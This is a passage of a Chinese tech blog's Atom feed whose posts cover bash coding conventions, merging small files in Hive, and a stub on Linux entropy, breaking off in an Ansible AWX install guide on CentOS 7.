0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用进程替换可实现重定向输出，但是请将命令放入显式子shell，而非while循环创建的隐式子shell。
例如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">total=0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">last_file=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 注意两个&lt;之间有空格，第一个为重定向，第二个&lt;()为进程替换</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while read count filename; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    total+="${count}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    last_file="${filename}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done &lt; &lt;(your_command | uniq -c)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "Total = ${total}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "Last one = ${last_file}"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="检查返回值">检查返回值<a class="hash-link" href="#检查返回值" title="标题的直接链接">​</a></h4><p>总是检查返回值，且提供有用的返回值。</p><p>对于非管道命令，使用 <code>$?</code> 或直接通过 <code>if</code> 语句来检查以保持其简洁。</p><p>例如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 使用if语句判断执行结果</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ! mv "${file_list}" "${dest_dir}/" ; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo "Unable to move ${file_list} to ${dest_dir}" &gt;&amp;2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exit "${E_BAD_MOVE}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 或者使用$?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv "${file_list}" "${dest_dir}/"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [[ $? -ne 0 ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo "Unable to move ${file_list} to ${dest_dir}" &gt;&amp;2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exit "${E_BAD_MOVE}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="内建命令和外部命令">内建命令和外部命令<a class="hash-link" href="#内建命令和外部命令" title="标题的直接链接">​</a></h4><p>当内建命令可以完成相同的任务时，在shell内建命令和调用外部命令之间，应尽量选择内建命令。</p><p>因内建命令相比外部命令而言会产生更少的依赖，且多数情况调用内建命令比调用外部命令可以获得更好的性能（通常外部命令会产生额外的进程开销）。</p><p>正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 使用内建的算术扩展</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addition=$((${X} + ${Y}))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 使用内建的字符串替换</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">substitution="${string/#foo/bar}"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 调用外部命令进行简单的计算</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addition="$(expr ${X} + ${Y})"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 调用外部命令进行简单的字符串替换</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">substitution="$(echo "${string}" | sed -e 's/^foo/bar/')"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="文件加载">文件加载<a class="hash-link" href="#文件加载" title="标题的直接链接">​</a></h4><p>加载外部库文件不建议用使用<code>.</code>，建议使用<code>source</code>，已提升可阅读性。
正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">source my_libs.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">. my_libs.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="内容过滤与统计">内容过滤与统计<a class="hash-link" href="#内容过滤与统计" title="标题的直接链接">​</a></h4><p>除非必要情况，尽量使用单个命令及其参数组合来完成一项任务，而非多个命令加上管道的不必要组合。
常见的不建议的用法例如：cat和grep连用过滤字符串; cat和wc连用统计行数; grep和wc连用统计行数等。</p><p>正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grep net.ipv4 /etc/sysctl.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grep -c net.ipv4 /etc/sysctl.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wc -l /etc/sysctl.conf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/sysctl.conf | grep net.ipv4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grep net.ipv4 /etc/sysctl.conf | wc -l</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/sysctl.conf | wc -l</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="正确使用返回与退出">正确使用返回与退出<a class="hash-link" href="#正确使用返回与退出" title="标题的直接链接">​</a></h4><p>除特殊情况外，几乎所有函数都不应该使用<code>exit</code>直接退出脚本，而应该使用<code>return</code>进行返回，以便后续逻辑中可以对错误进行处理。
正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 当函数返回后可以继续执行cleanup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my_func() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [[ -e /dummy ]] || return 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cleanup() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my_func</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cleanup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 当函数退出时，cleanup将不会被执行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my_func() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [[ -e /dummy ]] || exit 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cleanup() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my_func</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cleanup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="附常用工具">附：常用工具<a class="hash-link" href="#附常用工具" title="标题的直接链接">​</a></h2><p>推荐以下工具帮助我们进行代码的规范：</p><ul><li><a href="https://shellcheck.storage.googleapis.com/index.html" target="_blank" rel="noopener noreferrer" title="shell script analysis tool">ShellCheck</a></li></ul>]]></content>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[HIVE中常见的小文件合并方法]]></title>
        <id>/2019/09/02/hive-small-file</id>
        <link href="https://itxx00.github.io/notes/blog/2019/09/02/hive-small-file"/>
        <updated>2019-09-02T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[hive使用过程中应尽量避免产生小文件]]></summary>
        <content type="html"><![CDATA[<blockquote><p>介绍hive小文件常见处理方法</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="hive的文件产生过程">hive的文件产生过程<a class="hash-link" href="#hive的文件产生过程" title="标题的直接链接">​</a></h2><h2 class="anchor anchorWithStickyNavbar_LWe7" id="小文件太多的影响">小文件太多的影响<a class="hash-link" href="#小文件太多的影响" title="标题的直接链接">​</a></h2><h2 class="anchor anchorWithStickyNavbar_LWe7" id="为什么会产生小文件">为什么会产生小文件<a class="hash-link" href="#为什么会产生小文件" title="标题的直接链接">​</a></h2><h2 class="anchor anchorWithStickyNavbar_LWe7" id="如何处理小文件">如何处理小文件<a class="hash-link" href="#如何处理小文件" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-1">case 1<a class="hash-link" href="#case-1" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">INSERT OVERWRITE TABLE tb1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SELECT * FROM tb2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ORDER BY 1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ALTER TABLE tb2 RENAME TO b_tb2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ALTER TABLE tb1 RENAME TO tb2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-2">case 2<a class="hash-link" href="#case-2" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">INSERT TABLE tb1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SELECT c1, c2 FROM (</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SELECT c1, c2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    FROM tb2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    WHERE xxx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      AND xxx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ORDER BY c1, c2;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-3">case 3<a class="hash-link" href="#case-3" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SELECT c1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FROM  (</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xxx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GROUP BY x;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-4">case 4<a class="hash-link" href="#case-4" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">INSERT OVERWRITE TABLE tb1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SELECT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xxx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FROM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xxx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    WHERE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        xxx) t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distribute by rand();</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="case-5">case 5<a class="hash-link" href="#case-5" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">INSERT TABLE tb1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SELECT c1,c2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FROM tb2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WHERE xxx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sort by c1;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <category label="hive" term="hive"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[系统中的随机数和熵值]]></title>
        <id>/2019/05/12/random-and-entropy-in-centos7</id>
        <link href="https://itxx00.github.io/notes/blog/2019/05/12/random-and-entropy-in-centos7"/>
        <updated>2019-05-12T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[简单总结一下系统中的随机数以及相关问题]]></summary>
        <content type="html"><![CDATA[<blockquote><p>本文试着总结系统中的随机数前前后后以及管理中需要注意的问题 <!-- -->[先欠着]</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-什么是随机数">1 什么是随机数？<a class="hash-link" href="#1-什么是随机数" title="标题的直接链接">​</a></h2><p>随机数就是无法预测的数</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-随机数有什么用">2 随机数有什么用？<a class="hash-link" href="#2-随机数有什么用" title="标题的直接链接">​</a></h2><p>随机是为了安全</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-如何获得随机数">3 如何获得随机数？<a class="hash-link" href="#3-如何获得随机数" title="标题的直接链接">​</a></h2><p>/dev/random
/dev/urandom
/proc/sys/kernel/random/entropy_avail</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="4-会有哪些问题">4 会有哪些问题？<a class="hash-link" href="#4-会有哪些问题" title="标题的直接链接">​</a></h2><p>1 随机数数产生速度慢
2 影响上层应用</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="haveged-和-rng-tools">haveged 和 rng-tools<a class="hash-link" href="#haveged-和-rng-tools" title="标题的直接链接">​</a></h2>]]></content>
        <category label="centos7" term="centos7"/>
        <category label="random" term="random"/>
        <category label="entropy" term="entropy"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[CentOS7系统安装ansible awx记录]]></title>
        <id>/2017/12/20/centos7-install-ansible-awx</id>
        <link href="https://itxx00.github.io/notes/blog/2017/12/20/centos7-install-ansible-awx"/>
        <updated>2017-12-20T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[记录awx的安装测试过程以及需要注意的点]]></summary>
        <content type="html"><![CDATA[<blockquote><p>记录awx的安装测试过程以及需要注意的点</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="关于awx">关于awx<a class="hash-link" href="#关于awx" title="标题的直接链接">​</a></h2><p>awx(<a href="https://github.com/ansible/awx)%E6%98%AFansible" target="_blank" rel="noopener noreferrer">https://github.com/ansible/awx)是ansible</a> tower的开源版本，作为tower的upstream对外开源，
项目从2013年开始维护，2017年由redhat对外开源，目前维护得比较活跃。由于官方的install guide写得有点杂不是很直观，
导致想要安装个简单的测试环境体验一下功能都要折腾半天，这里提供一个简单版本的安装流程方便快速体验。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="安装过程">安装过程<a class="hash-link" href="#安装过程" title="标题的直接链接">​</a></h2><p>安装软件包</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yum -y install epel-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl disable firewalld</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl stop firewalld</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setenforce 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">yum -y install git gettext ansible docker nodejs npm gcc-c++ bzip2 python-docker-py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 